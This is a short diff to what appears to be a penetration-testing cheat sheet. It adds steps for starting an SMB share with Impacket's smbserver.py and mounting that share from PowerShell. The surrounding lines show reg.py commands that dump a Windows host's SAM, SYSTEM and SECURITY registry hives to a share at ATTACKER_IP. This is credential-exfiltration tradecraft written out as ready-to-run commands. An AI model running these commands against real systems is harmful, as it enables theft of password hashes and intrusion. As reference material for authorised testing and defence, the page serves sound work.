@@ -48,6 +48,15 @@ reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\A
 # backup all SAM, SYSTEM and SECURITY hives at once
 reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
 ```
+
+```bash
+# Start an SMB share
+$ smbserver.py -smb2support "someshare" "./" -user veresk -password veresk
+
+# Mount the smb share with
+PS> New-PSDrive -Name 'someshare' -PSProvider FileSystem -Credential $cred -Root '\\10.11.55.3\someshare'
+PS> dir someshare:
+```
 {% endtab %}
 
 {% tab title="Live Windows" %}
